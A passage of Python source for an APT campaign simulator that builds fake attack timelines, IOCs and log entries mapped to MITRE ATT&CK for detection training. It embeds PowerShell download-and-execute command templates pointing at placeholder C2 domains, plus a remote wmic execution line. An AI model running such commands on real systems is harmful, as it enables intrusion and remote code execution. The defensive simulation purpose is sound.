#!/usr/bin/env python3
"""
AEGIS APT Campaign Simulator
=============================
Full Advanced Persistent Threat campaign simulation with configurable stages,
MITRE ATT&CK mapping, realistic IOC generation, and comprehensive reporting.

EDUCATIONAL USE ONLY - All operations are simulated for training purposes.
No actual attacks are executed against any targets.
"""

import os
import sys
import json
import uuid
import random
import hashlib
import datetime
import argparse
import ipaddress
from collections import defaultdict

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.syntax import Syntax
    from rich.tree import Tree
    from rich.columns import Columns
    from rich.text import Text
    from rich.layout import Layout
except ImportError:
    print("[!] rich library required: pip install rich")
    sys.exit(1)

console = Console()

# ─── MITRE ATT&CK Technique Database ───────────────────────────────────
MITRE_TECHNIQUES = {
    "initial_access": {
        "T1566.001": {"name": "Spearphishing Attachment", "tactic": "Initial Access",
                       "desc": "Email with malicious attachment targeting specific individuals"},
        "T1566.002": {"name": "Spearphishing Link", "tactic": "Initial Access",
                       "desc": "Email with link to credential harvesting or exploit page"},
        "T1189":     {"name": "Drive-by Compromise", "tactic": "Initial Access",
                       "desc": "Watering hole attack via compromised website"},
        "T1195.002": {"name": "Supply Chain Compromise", "tactic": "Initial Access",
                       "desc": "Compromise of software supply chain to distribute malware"},
        "T1190":     {"name": "Exploit Public-Facing Application", "tactic": "Initial Access",
                       "desc": "Exploitation of vulnerabilities in internet-facing services"},
        "T1133":     {"name": "External Remote Services", "tactic": "Initial Access",
                       "desc": "Abuse of VPN, Citrix, or RDP services with valid credentials"},
    },
    "execution": {
        "T1059.001": {"name": "PowerShell", "tactic": "Execution",
                       "desc": "Use PowerShell for command execution and script running"},
        "T1059.003": {"name": "Windows Command Shell", "tactic": "Execution",
                       "desc": "Use cmd.exe for command execution"},
        "T1047":     {"name": "WMI", "tactic": "Execution",
                       "desc": "Windows Management Instrumentation for remote execution"},
        "T1053.005": {"name": "Scheduled Task", "tactic": "Execution",
                       "desc": "Create scheduled tasks for execution and persistence"},
        "T1204.002": {"name": "Malicious File", "tactic": "Execution",
                       "desc": "User executes malicious file delivered via phishing"},
        "T1059.005": {"name": "Visual Basic", "tactic": "Execution",
                       "desc": "VBScript or VBA macro execution"},
    },
    "persistence": {
        "T1547.001": {"name": "Registry Run Keys", "tactic": "Persistence",
                       "desc": "Add entries to Run/RunOnce registry keys"},
        "T1053.005": {"name": "Scheduled Task", "tactic": "Persistence",
                       "desc": "Create persistent scheduled tasks"},
        "T1574.001": {"name": "DLL Search Order Hijacking", "tactic": "Persistence",
                       "desc": "Place malicious DLL in application search path"},
        "T1546.003": {"name": "WMI Event Subscription", "tactic": "Persistence",
                       "desc": "Use WMI event subscriptions for persistence"},
        "T1543.003": {"name": "Windows Service", "tactic": "Persistence",
                       "desc": "Create or modify Windows services for persistence"},
        "T1547.004": {"name": "Winlogon Helper DLL", "tactic": "Persistence",
                       "desc": "Modify Winlogon registry entries for persistence"},
    },
    "privilege_escalation": {
        "T1134.001": {"name": "Token Impersonation", "tactic": "Privilege Escalation",
                       "desc": "Impersonate tokens of higher-privileged processes"},
        "T1548.002": {"name": "UAC Bypass", "tactic": "Privilege Escalation",
                       "desc": "Bypass User Account Control mechanisms"},
        "T1068":     {"name": "Exploitation for Privilege Escalation", "tactic": "Privilege Escalation",
                       "desc": "Exploit software vulnerabilities to gain elevated privileges"},
        "T1055.001": {"name": "DLL Injection", "tactic": "Privilege Escalation",
                       "desc": "Inject DLL into higher-privileged process"},
        "T1543.003": {"name": "Windows Service", "tactic": "Privilege Escalation",
                       "desc": "Create service running as SYSTEM"},
    },
    "defense_evasion": {
        "T1055":     {"name": "Process Injection", "tactic": "Defense Evasion",
                       "desc": "Inject code into legitimate processes"},
        "T1562.001": {"name": "Disable Security Tools", "tactic": "Defense Evasion",
                       "desc": "Disable or tamper with security software"},
        "T1070.006": {"name": "Timestomping", "tactic": "Defense Evasion",
                       "desc": "Modify file timestamps to blend in"},
        "T1027":     {"name": "Obfuscated Files", "tactic": "Defense Evasion",
                       "desc": "Encode or encrypt payloads to evade detection"},
        "T1036.005": {"name": "Match Legitimate Name", "tactic": "Defense Evasion",
                       "desc": "Rename malware to match legitimate system files"},
        "T1140":     {"name": "Deobfuscate/Decode Files", "tactic": "Defense Evasion",
                       "desc": "Decode or decompress encoded payloads at runtime"},
        "T1562.006": {"name": "Indicator Blocking", "tactic": "Defense Evasion",
                       "desc": "Block reporting of indicators to security tools"},
    },
    "credential_access": {
        "T1003.001": {"name": "LSASS Memory", "tactic": "Credential Access",
                       "desc": "Dump credentials from LSASS process memory"},
        "T1003.002": {"name": "SAM Database", "tactic": "Credential Access",
                       "desc": "Extract password hashes from SAM registry hive"},
        "T1558.003": {"name": "Kerberoasting", "tactic": "Credential Access",
                       "desc": "Request Kerberos service tickets for offline cracking"},
        "T1003.006": {"name": "DCSync", "tactic": "Credential Access",
                       "desc": "Replicate AD credentials via Directory Replication Service"},
        "T1110.003": {"name": "Password Spraying", "tactic": "Credential Access",
                       "desc": "Try common passwords against many accounts"},
        "T1555.003": {"name": "Credentials from Web Browsers", "tactic": "Credential Access",
                       "desc": "Extract saved credentials from browser stores"},
    },
    "lateral_movement": {
        "T1021.002": {"name": "SMB/Windows Admin Shares", "tactic": "Lateral Movement",
                       "desc": "Move laterally via SMB admin shares (C$, ADMIN$)"},
        "T1021.001": {"name": "Remote Desktop Protocol", "tactic": "Lateral Movement",
                       "desc": "Use RDP for lateral movement to other hosts"},
        "T1021.006": {"name": "Windows Remote Management", "tactic": "Lateral Movement",
                       "desc": "Use WinRM/PSRemoting for lateral movement"},
        "T1570":     {"name": "Lateral Tool Transfer", "tactic": "Lateral Movement",
                       "desc": "Transfer tools between systems in the network"},
        "T1021.003": {"name": "DCOM", "tactic": "Lateral Movement",
                       "desc": "Use Distributed COM for remote execution"},
    },
    "collection": {
        "T1056.001": {"name": "Keylogging", "tactic": "Collection",
                       "desc": "Capture keystrokes from user input"},
        "T1113":     {"name": "Screen Capture", "tactic": "Collection",
                       "desc": "Capture screenshots of user desktop"},
        "T1115":     {"name": "Clipboard Data", "tactic": "Collection",
                       "desc": "Collect data from clipboard"},
        "T1005":     {"name": "Data from Local System", "tactic": "Collection",
                       "desc": "Collect sensitive data from local files"},
        "T1039":     {"name": "Data from Network Shared Drive", "tactic": "Collection",
                       "desc": "Collect data from network file shares"},
        "T1114.001": {"name": "Local Email Collection", "tactic": "Collection",
                       "desc": "Collect email from local Outlook data files"},
    },
    "exfiltration": {
        "T1048.003": {"name": "Exfiltration Over Unencrypted Protocol", "tactic": "Exfiltration",
                       "desc": "Exfiltrate data over DNS, HTTP, or ICMP"},
        "T1041":     {"name": "Exfiltration Over C2 Channel", "tactic": "Exfiltration",
                       "desc": "Exfiltrate data using existing C2 communication"},
        "T1567.002": {"name": "Exfiltration to Cloud Storage", "tactic": "Exfiltration",
                       "desc": "Upload data to cloud storage services"},
        "T1048.001": {"name": "Exfiltration Over Symmetric Encrypted Protocol", "tactic": "Exfiltration",
                       "desc": "Exfiltrate data over HTTPS or encrypted channel"},
        "T1030":     {"name": "Data Transfer Size Limits", "tactic": "Exfiltration",
                       "desc": "Break data into small chunks to avoid detection"},
    },
    "impact": {
        "T1486":     {"name": "Data Encrypted for Impact", "tactic": "Impact",
                       "desc": "Encrypt files and demand ransom for decryption"},
        "T1485":     {"name": "Data Destruction", "tactic": "Impact",
                       "desc": "Destroy data to disrupt availability"},
        "T1490":     {"name": "Inhibit System Recovery", "tactic": "Impact",
                       "desc": "Delete shadow copies and disable recovery"},
        "T1489":     {"name": "Service Stop", "tactic": "Impact",
                       "desc": "Stop critical services to cause disruption"},
        "T1529":     {"name": "System Shutdown/Reboot", "tactic": "Impact",
                       "desc": "Shutdown or reboot systems after impact"},
    },
}

# ─── APT Group Profiles ────────────────────────────────────────────────
APT_PROFILES = {
    "APT29": {
        "aliases": ["Cozy Bear", "The Dukes", "NOBELIUM"],
        "origin": "Russia (SVR)",
        "targets": ["Government", "Think Tanks", "Healthcare", "Energy"],
        "sophistication": "HIGH",
        "preferred_techniques": ["T1566.001", "T1059.001", "T1547.001", "T1003.001",
                                  "T1021.002", "T1041", "T1027"],
        "tools": ["Cobalt Strike", "SunBurst", "EnvyScout", "BoomBox", "NativeZone"],
        "description": "Russian state-sponsored group known for long-term espionage campaigns",
    },
    "APT28": {
        "aliases": ["Fancy Bear", "Sofacy", "Strontium"],
        "origin": "Russia (GRU Unit 26165)",
        "targets": ["Government", "Military", "Media", "Elections"],
        "sophistication": "HIGH",
        "preferred_techniques": ["T1566.002", "T1059.001", "T1053.005", "T1558.003",
                                  "T1021.001", "T1048.003"],
        "tools": ["X-Agent", "X-Tunnel", "Seduploader", "Zebrocy", "LoJax"],
        "description": "Russian military intelligence unit conducting espionage and influence operations",
    },
    "APT41": {
        "aliases": ["Winnti", "Barium", "Wicked Panda"],
        "origin": "China (MSS / Private)",
        "targets": ["Technology", "Healthcare", "Telecom", "Gaming", "Finance"],
        "sophistication": "HIGH",
        "preferred_techniques": ["T1195.002", "T1190", "T1059.001", "T1574.001",
                                  "T1003.001", "T1021.002", "T1486"],
        "tools": ["ShadowPad", "Winnti", "PlugX", "Cobalt Strike", "Crosswalk"],
        "description": "Chinese state-sponsored group conducting both espionage and financial crime",
    },
    "Lazarus": {
        "aliases": ["Hidden Cobra", "ZINC", "Labyrinth Chollima"],
        "origin": "North Korea (RGB)",
        "targets": ["Finance", "Cryptocurrency", "Defense", "Entertainment"],
        "sophistication": "HIGH",
        "preferred_techniques": ["T1566.001", "T1204.002", "T1059.001", "T1134.001",
                                  "T1055", "T1486", "T1485"],
        "tools": ["ELECTRICFISH", "HOPLIGHT", "BISTROMATH", "AppleJeus", "DreamJob"],
        "description": "North Korean state-sponsored group focused on financial theft and espionage",
    },
    "Sandworm": {
        "aliases": ["Voodoo Bear", "IRIDIUM", "Electrum"],
        "origin": "Russia (GRU Unit 74455)",
        "targets": ["Energy", "Government", "Media", "ICS/SCADA"],
        "sophistication": "VERY HIGH",
        "preferred_techniques": ["T1190", "T1059.001", "T1053.005", "T1068",
                                  "T1003.001", "T1486", "T1485", "T1490"],
        "tools": ["NotPetya", "Industroyer", "BlackEnergy", "Olympic Destroyer", "CaddyWiper"],
        "description": "Russian military unit conducting destructive cyberattacks against critical infrastructure",
    },
}

# ─── Noise Level Profiles ──────────────────────────────────────────────
NOISE_LEVELS = {
    "stealth": {
        "description": "Minimal footprint, slow operation, high evasion",
        "log_probability": 0.15,
        "sleep_range": (300, 3600),
        "obfuscation": True,
        "living_off_land": True,
        "custom_tools": False,
    },
    "balanced": {
        "description": "Mix of custom and LOLBins, moderate speed",
        "log_probability": 0.45,
        "sleep_range": (30, 300),
        "obfuscation": True,
        "living_off_land": True,
        "custom_tools": True,
    },
    "noisy": {
        "description": "Fast operation, high detection risk, many artifacts",
        "log_probability": 0.85,
        "sleep_range": (1, 30),
        "obfuscation": False,
        "living_off_land": False,
        "custom_tools": True,
    },
}


class APTCampaignEvent:
    """Represents a single event in an APT campaign timeline."""

    def __init__(self, stage, technique_id, technique_name, action, host,
                 user="SYSTEM", success=True, detection_score=0.0):
        self.timestamp = datetime.datetime.now()
        self.event_id = str(uuid.uuid4())[:8]
        self.stage = stage
        self.technique_id = technique_id
        self.technique_name = technique_name
        self.action = action
        self.host = host
        self.user = user
        self.success = success
        self.detection_score = detection_score
        self.iocs = []
        self.log_entries = []

    def add_ioc(self, ioc_type, value, confidence="HIGH"):
        self.iocs.append({
            "type": ioc_type,
            "value": value,
            "confidence": confidence,
            "first_seen": self.timestamp.isoformat(),
        })

    def add_log_entry(self, source, event_id, message):
        self.log_entries.append({
            "timestamp": self.timestamp.isoformat(),
            "source": source,
            "event_id": event_id,
            "message": message,
        })

    def to_dict(self):
        return {
            "event_id": self.event_id,
            "timestamp": self.timestamp.isoformat(),
            "stage": self.stage,
            "technique_id": self.technique_id,
            "technique_name": self.technique_name,
            "action": self.action,
            "host": self.host,
            "user": self.user,
            "success": self.success,
            "detection_score": self.detection_score,
            "iocs": self.iocs,
            "log_entries": self.log_entries,
        }


class APTSimulator:
    """
    Advanced Persistent Threat Campaign Simulator

    Simulates full APT campaign lifecycles with configurable stages,
    noise levels, and sophistication. All operations are simulated --
    no actual attacks are executed.

    Usage:
        simulator = APTSimulator(config)
        simulator.run()
    """

    HELP_TEXT = """
AEGIS APT Campaign Simulator
=============================
Simulates Advanced Persistent Threat campaigns for training and detection testing.

Commands:
  simulate <profile>     Run full APT simulation using named profile
  stage <name>           Run a specific campaign stage
  list-profiles          Show available APT group profiles
  list-stages            Show all campaign stages
  configure              Interactive campaign configuration
  report                 Generate campaign report from last simulation
  export-iocs            Export generated IOCs
  timeline               Show campaign timeline
  help                   Show this help message

Stages:
  initial_access         Phishing, watering hole, supply chain
  execution              PowerShell, WMI, scheduled tasks
  persistence            Registry, startup, DLL hijacking
  privilege_escalation   Token manipulation, UAC bypass
  defense_evasion        Process injection, AMSI bypass, timestomping
  credential_access      Mimikatz, LSASS dump, Kerberoasting
  lateral_movement       PsExec, WMI, RDP, SMB
  collection             Keylogging, screen capture, clipboard
  exfiltration           DNS tunneling, HTTPS, steganography
  impact                 Encryption, wiper, data destruction

Options:
  --noise <level>        stealth | balanced | noisy (default: balanced)
  --profile <name>       APT29 | APT28 | APT41 | Lazarus | Sandworm
  --target <network>     Target network CIDR (simulated)
  --duration <hours>     Simulated campaign duration
  --output <file>        Export report to JSON file
"""

    def __init__(self, target_network="10.0.0.0/24", noise_level="balanced",
                 apt_profile=None, duration_hours=72):
        """Initialize the APT simulator with campaign parameters."""
        self.campaign_id = str(uuid.uuid4())[:12]
        self.target_network = target_network
        self.noise_config = NOISE_LEVELS.get(noise_level, NOISE_LEVELS["balanced"])
        self.noise_level = noise_level
        self.apt_profile = APT_PROFILES.get(apt_profile) if apt_profile else None
        self.apt_name = apt_profile or "Custom"
        self.duration_hours = duration_hours
        self.events = []
        self.compromised_hosts = set()
        self.compromised_credentials = []
        self.generated_iocs = []
        self.detection_alerts = []
        self.start_time = None
        self.end_time = None
        self._verify_authorization()

    def _verify_authorization(self):
        """Verify operator has authorization to run simulation."""
        console.print(Panel(
            "[bold yellow]AUTHORIZATION CHECK[/bold yellow]\n\n"
            "This module simulates APT campaigns for [bold]educational purposes only[/bold].\n"
            "All operations are simulated -- no actual attacks are executed.\n"
            "Ensure you have proper authorization before proceeding.",
            title="AEGIS APT Simulator",
            border_style="yellow"
        ))

    def _generate_target_hosts(self, count=10):
        """Generate simulated target hosts from the target network."""
        network = ipaddress.ip_network(self.target_network, strict=False)
        hosts = list(network.hosts())
        if len(hosts) > count:
            hosts = random.sample(hosts, count)
        host_list = []
        hostnames = [
            "DC01", "DC02", "EXCH01", "FILE01", "WEB01", "SQL01",
            "WKS001", "WKS002", "WKS003", "WKS004", "WKS005",
            "APP01", "CITRIX01", "VPN-GW", "MGMT01", "BACKUP01",
        ]
        for i, ip in enumerate(hosts):
            hostname = hostnames[i] if i < len(hostnames) else f"HOST{i:03d}"
            host_list.append({
                "ip": str(ip),
                "hostname": hostname,
                "os": random.choice(["Windows Server 2019", "Windows Server 2022",
                                     "Windows 10 Enterprise", "Windows 11 Enterprise"]),
                "role": random.choice(["Domain Controller", "File Server", "Web Server",
                                       "Workstation", "Database Server", "Exchange Server"]),
                "compromised": False,
            })
        return host_list

    def _gen_fake_hash(self, seed=""):
        """Generate a realistic-looking file hash for IOC generation."""
        data = f"{seed}{random.random()}{self.campaign_id}".encode()
        return hashlib.sha256(data).hexdigest()

    def _gen_fake_ip(self):
        """Generate a fake C2 IP address."""
        return f"{random.randint(45, 200)}.{random.randint(10, 250)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def _gen_fake_domain(self):
        """Generate a realistic-looking malicious domain."""
        words = ["update", "cloud", "service", "portal", "login", "auth", "sync",
                 "cdn", "api", "mail", "drive", "store", "app", "web", "secure"]
        tlds = [".com", ".net", ".org", ".io", ".co", ".xyz", ".top"]
        domain = f"{random.choice(words)}-{random.choice(words)}{random.randint(1, 99)}{random.choice(tlds)}"
        return domain

    def _should_generate_log(self):
        """Determine if this action generates a detectable log entry based on noise level."""
        return random.random() < self.noise_config["log_probability"]

    # ─── Stage Simulators ──────────────────────────────────────────────

    def simulate_initial_access(self, targets):
        """Simulate initial access stage of APT campaign."""
        stage = "initial_access"
        techniques = MITRE_TECHNIQUES[stage]
        chosen = random.sample(list(techniques.keys()), min(2, len(techniques)))

        for tech_id in chosen:
            tech = techniques[tech_id]
            target = random.choice(targets)

            if tech_id == "T1566.001":
                # Spearphishing attachment
                filename = random.choice([
                    "Q4_Financial_Report.xlsm", "Meeting_Agenda.docm",
                    "Invoice_2024.pdf.exe", "Resume_JohnDoe.docm",
                    "Security_Update.hta", "Project_Proposal.xlsm",
                ])
                file_hash = self._gen_fake_hash("phish_attachment")
                sender = f"{random.choice(['hr', 'finance', 'ceo', 'it'])}@{self._gen_fake_domain()}"
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Sent spearphishing email with attachment '{filename}' from {sender}",
                    target["hostname"], user=target.get("user", "jsmith"),
                )
                event.add_ioc("file_hash_sha256", file_hash)
                event.add_ioc("email_sender", sender)
                event.add_ioc("filename", filename)
                if self._should_generate_log():
                    event.add_log_entry("Exchange", "SMTP-RECV",
                                        f"Message received from {sender} with attachment {filename}")
                    event.add_log_entry("Windows Defender", "1116",
                                        f"Suspicious macro detected in {filename}")

            elif tech_id == "T1189":
                # Drive-by compromise (watering hole)
                watering_hole = self._gen_fake_domain()
                exploit_kit = random.choice(["RIG EK", "Fallout EK", "Magnitude EK", "custom"])
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Watering hole attack via compromised site {watering_hole} using {exploit_kit}",
                    target["hostname"],
                )
                event.add_ioc("domain", watering_hole)
                event.add_ioc("url", f"https://{watering_hole}/assets/update.js")
                if self._should_generate_log():
                    event.add_log_entry("Proxy", "HTTP-GET",
                                        f"Connection to {watering_hole} with suspicious JS redirect")

            elif tech_id == "T1195.002":
                # Supply chain compromise
                package = random.choice(["vendor-sdk-v3.2.1", "monitoring-agent-4.1.0",
                                          "auth-library-2.5.3", "logging-framework-1.8.0"])
                backdoor_hash = self._gen_fake_hash("supply_chain")
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Compromised software package '{package}' with backdoor",
                    target["hostname"],
                )
                event.add_ioc("file_hash_sha256", backdoor_hash)
                event.add_ioc("package_name", package)
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "1",
                                        f"Process created from recently updated package {package}")

            else:
                c2_ip = self._gen_fake_ip()
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Initial access via {tech['name']} targeting {target['hostname']}",
                    target["hostname"],
                )
                event.add_ioc("ip", c2_ip)

            self.events.append(event)
            target["compromised"] = True
            self.compromised_hosts.add(target["hostname"])

        return len(chosen)

    def simulate_execution(self, targets):
        """Simulate execution stage -- running commands on compromised hosts."""
        stage = "execution"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        if not compromised:
            return 0

        count = 0
        for target in compromised[:3]:
            tech_id = random.choice(list(techniques.keys()))
            tech = techniques[tech_id]

            if tech_id == "T1059.001":
                # PowerShell execution
                ps_commands = [
                    "IEX (New-Object Net.WebClient).DownloadString('https://{c2}/stager.ps1')",
                    "powershell -enc {base64_payload} -ExecutionPolicy Bypass -NoProfile",
                    "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('{payload}'))",
                    "Invoke-Expression (Get-Content C:\\Windows\\Temp\\update.txt)",
                    "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); IEX $wc.DownloadString('https://{c2}/beacon')",
                ]
                cmd = random.choice(ps_commands).format(
                    c2=self._gen_fake_domain(),
                    base64_payload="SW52b2tlLUV4cHJlc3Npb24...",
                    payload="TVqQAAMAAAAE..."
                )
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"PowerShell execution: {cmd[:80]}...",
                    target["hostname"],
                )
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "1",
                                        f"Process Create: powershell.exe -enc ...")
                    event.add_log_entry("PowerShell", "4104",
                                        f"Suspicious script block logged: {cmd[:50]}...")
                    event.add_log_entry("Windows Defender", "1116",
                                        "AMSI detection: Invoke-Mimikatz pattern detected")

            elif tech_id == "T1047":
                # WMI execution
                wmi_cmd = f"wmic /node:{target['ip']} process call create 'cmd.exe /c {random.choice(['whoami', 'systeminfo', 'net user'])}'"
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"WMI remote execution on {target['hostname']}: {wmi_cmd[:60]}...",
                    target["hostname"],
                )
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "1",
                                        f"WmiPrvSE.exe spawned cmd.exe on {target['hostname']}")
                    event.add_log_entry("WMI", "5861",
                                        "WMI provider loaded for remote execution")

            else:
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Executed {tech['name']} on {target['hostname']}",
                    target["hostname"],
                )

            self.events.append(event)
            count += 1

        return count

    def simulate_persistence(self, targets):
        """Simulate persistence mechanisms on compromised hosts."""
        stage = "persistence"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        if not compromised:
            return 0

        count = 0
        for target in compromised[:3]:
            tech_id = random.choice(list(techniques.keys()))
            tech = techniques[tech_id]

            if tech_id == "T1547.001":
                # Registry Run keys
                reg_paths = [
                    r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                    r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                ]
                malware_path = random.choice([
                    r"C:\Windows\Temp\svchost.exe",
                    r"C:\ProgramData\Microsoft\WindowsUpdate.exe",
                    r"C:\Users\Public\Documents\helper.exe",
                ])
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Added registry persistence: {random.choice(reg_paths)} -> {malware_path}",
                    target["hostname"],
                )
                event.add_ioc("registry_key", reg_paths[0])
                event.add_ioc("file_path", malware_path)
                event.add_ioc("file_hash_sha256", self._gen_fake_hash("persist_reg"))
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "13",
                                        f"Registry value set: {reg_paths[0]}\\WindowsUpdate = {malware_path}")

            elif tech_id == "T1574.001":
                # DLL hijacking
                target_app = random.choice(["notepad++", "7-zip", "WinRAR", "VLC", "Chrome"])
                dll_name = random.choice(["version.dll", "dbghelp.dll", "winmm.dll", "msvcp140.dll"])
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"DLL hijack: planted {dll_name} in {target_app} directory",
                    target["hostname"],
                )
                event.add_ioc("file_hash_sha256", self._gen_fake_hash("dll_hijack"))
                event.add_ioc("filename", dll_name)
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "7",
                                        f"Image loaded: {dll_name} from non-standard path")

            elif tech_id == "T1546.003":
                # WMI event subscription
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Created WMI event subscription for persistence on {target['hostname']}",
                    target["hostname"],
                )
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "19",
                                        "WMI EventFilter created: __InstanceModificationEvent within 60")
                    event.add_log_entry("Sysmon", "20",
                                        "WMI EventConsumer created: CommandLineEventConsumer")
                    event.add_log_entry("Sysmon", "21",
                                        "WMI FilterToConsumerBinding created")
            else:
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Established {tech['name']} persistence on {target['hostname']}",
                    target["hostname"],
                )

            self.events.append(event)
            count += 1

        return count

    def simulate_privilege_escalation(self, targets):
        """Simulate privilege escalation attempts."""
        stage = "privilege_escalation"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        if not compromised:
            return 0

        count = 0
        for target in compromised[:2]:
            tech_id = random.choice(list(techniques.keys()))
            tech = techniques[tech_id]

            if tech_id == "T1548.002":
                # UAC Bypass
                bypass_method = random.choice([
                    "fodhelper.exe registry manipulation",
                    "eventvwr.exe mmc hijack",
                    "computerdefaults.exe CurVer hijack",
                    "sdclt.exe IsolatedCommand",
                    "cmstp.exe INF file",
                ])
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"UAC bypass via {bypass_method} on {target['hostname']}",
                    target["hostname"], user="SYSTEM",
                )
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "1",
                                        f"Process Create: High integrity cmd.exe via {bypass_method}")

            elif tech_id == "T1068":
                # Kernel exploit
                exploit = random.choice([
                    "CVE-2021-34527 (PrintNightmare)",
                    "CVE-2021-1675 (Print Spooler)",
                    "CVE-2020-1472 (Zerologon)",
                    "CVE-2021-36934 (HiveNightmare)",
                    "CVE-2022-21882 (Win32k EoP)",
                ])
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Exploited {exploit} for SYSTEM privileges on {target['hostname']}",
                    target["hostname"], user="SYSTEM",
                )
                event.add_ioc("cve", exploit.split("(")[0].strip())
                if self._should_generate_log():
                    event.add_log_entry("Windows Security", "4672",
                                        "Special privileges assigned to new logon: SYSTEM")
            else:
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Privilege escalation via {tech['name']} on {target['hostname']}",
                    target["hostname"], user="SYSTEM",
                )

            self.events.append(event)
            count += 1

        return count

    def simulate_defense_evasion(self, targets):
        """Simulate defense evasion techniques."""
        stage = "defense_evasion"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        if not compromised:
            return 0

        count = 0
        for target in compromised[:3]:
            tech_id = random.choice(list(techniques.keys()))
            tech = techniques[tech_id]

            if tech_id == "T1055":
                # Process injection
                target_proc = random.choice(["explorer.exe", "svchost.exe", "lsass.exe",
                                              "RuntimeBroker.exe", "SearchUI.exe"])
                injection_type = random.choice(["Classic DLL Injection", "Process Hollowing",
                                                 "APC Queue Injection", "Thread Hijacking",
                                                 "Process Doppelganging"])
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"{injection_type} into {target_proc} on {target['hostname']}",
                    target["hostname"],
                )
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "8",
                                        f"CreateRemoteThread detected in {target_proc}")
                    event.add_log_entry("Sysmon", "10",
                                        f"Process access: PROCESS_VM_WRITE to {target_proc}")

            elif tech_id == "T1070.006":
                # Timestomping
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Timestomped malware files to match system32 creation dates on {target['hostname']}",
                    target["hostname"],
                )
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "2",
                                        "File creation time changed: C:\\Windows\\Temp\\svchost.exe")
            else:
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Applied {tech['name']} on {target['hostname']}",
                    target["hostname"],
                )

            self.events.append(event)
            count += 1

        return count

    def simulate_credential_access(self, targets):
        """Simulate credential harvesting techniques."""
        stage = "credential_access"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        if not compromised:
            return 0

        count = 0
        fake_users = ["admin", "jsmith", "svc_backup", "svc_sql", "domain_admin",
                      "helpdesk", "db_admin", "web_svc", "exchange_svc"]

        for target in compromised[:2]:
            tech_id = random.choice(list(techniques.keys()))
            tech = techniques[tech_id]

            creds_found = random.sample(fake_users, random.randint(2, 5))

            if tech_id == "T1003.001":
                # LSASS dump
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Dumped LSASS process memory on {target['hostname']} -- found {len(creds_found)} credential sets",
                    target["hostname"], user="SYSTEM",
                )
                for user in creds_found:
                    fake_hash = self._gen_fake_hash(f"ntlm_{user}")[:32]
                    event.add_ioc("credential", f"{user}:{fake_hash}")
                    self.compromised_credentials.append({
                        "username": user, "hash": fake_hash,
                        "source": target["hostname"], "type": "NTLM",
                    })
                if self._should_generate_log():
                    event.add_log_entry("Sysmon", "10",
                                        "Process access to lsass.exe: PROCESS_VM_READ")
                    event.add_log_entry("Windows Security", "4656",
                                        "Handle request to lsass.exe")

            elif tech_id == "T1558.003":
                # Kerberoasting
                spn_accounts = [f"svc_{s}" for s in ["mssql", "http", "exchange", "backup"]]
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Kerberoasting: requested TGS tickets for {len(spn_accounts)} service accounts",
                    target["hostname"],
                )
                for acct in spn_accounts:
                    event.add_ioc("service_account", acct)
                if self._should_generate_log():
                    event.add_log_entry("Windows Security", "4769",
                                        f"Kerberos Service Ticket requested for multiple SPNs (RC4 encryption)")
            else:
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Credential access via {tech['name']} on {target['hostname']}",
                    target["hostname"],
                )

            self.events.append(event)
            count += 1

        return count

    def simulate_lateral_movement(self, targets):
        """Simulate lateral movement between compromised hosts."""
        stage = "lateral_movement"
        techniques = MITRE_TECHNIQUES[stage]
        compromised = [t for t in targets if t.get("compromised")]
        not_compromised = [t for t in targets if not t.get("compromised")]
        if not compromised or not not_compromised:
            return 0

        count = 0
        for new_target in not_compromised[:3]:
            source = random.choice(compromised)
            tech_id = random.choice(list(techniques.keys()))
            tech = techniques[tech_id]

            if tech_id == "T1021.002":
                # SMB admin shares
                share = random.choice(["C$", "ADMIN$", "IPC$"])
                cred = random.choice(self.compromised_credentials) if self.compromised_credentials else {"username": "admin"}
                event = APTCampaignEvent(
                    stage, tech_id, tech["name"],
                    f"Lateral movement via SMB ({share}) from {source['hostname']} to {new_target['hostname']} as {cred['username']}",
                    new_target["hostname"], user=cred["username"],
                )
